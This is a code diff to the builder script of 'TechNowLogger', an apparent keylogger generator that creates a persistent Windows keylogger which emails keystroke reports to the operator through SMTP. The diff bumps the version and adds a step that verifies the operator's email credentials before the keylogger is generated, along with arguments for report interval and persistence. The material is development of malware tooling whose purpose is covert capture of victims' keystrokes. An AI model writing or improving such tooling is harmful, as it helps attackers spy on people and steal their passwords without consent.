@@ -6,8 +6,11 @@ import subprocess
 import os
 import banners
 import shutil
+import smtplib
 from essential_generators import DocumentGenerator
 import platform
+import socket
+socket.setdefaulttimeout(5)
 from colorama import init
 from colorama import Fore, Back, Style
 init()
@@ -20,7 +23,7 @@ elif platform.system() == 'Linux':
     WINDOWS_PYTHON_PYINSTALLER_PATH = "wine ~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe"
 
 def get_arguments():
-    parser = argparse.ArgumentParser(description=f'{Fore.RED}TechNowLogger v2.1')
+    parser = argparse.ArgumentParser(description=f'{Fore.RED}TechNowLogger v2.2')
     parser._optionals.title = f"{Fore.GREEN}Optional Arguments{Fore.YELLOW}"
     parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds. default=120", default=120)
     parser.add_argument("-t", "--persistence", dest="time_persistent", help="Becoming Persistence After __ seconds. default=10", default=10)    
@@ -104,6 +107,18 @@ def check_dependencies():
             print(f"{Fore.YELLOW}[ X ] You Are Using Python {sys.version[:5]}")
             print(f"{Fore.YELLOW}[ X ] Try to Install Python 3.7.4")
             quit()        
+
+def validate_credentials(email, password, smtp_server, smtp_port):
+    try:
+        print(f"{Fore.YELLOW}\n[*] Validating Email Credentials...")
+        server = smtplib.SMTP(smtp_server, int(smtp_port))
+        server.starttls()
+        server.login(email, password)
+        server.quit()
+        print(f"{Fore.GREEN}[+] Credentials Verified : )\n")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Incorrect Email Credentials : {e}")
+        sys.exit()
 
 def create_keylogger(file_name, interval, email, password, time_persistent, smtp_server, smtp_port):
     with open(file_name, "w+") as file:
@@ -315,6 +330,7 @@ if __name__ == '__main__':
             arguments.smtp_port = int(input('\n[?] Type your smtp port: '))
             
         check_dependencies()
+        validate_credentials(arguments.email, arguments.password, arguments.smtp_server, arguments.smtp_port)
 
         print(f"\n{Fore.YELLOW}[*] Generating Please wait for a while...{Fore.MAGENTA}\n")
 
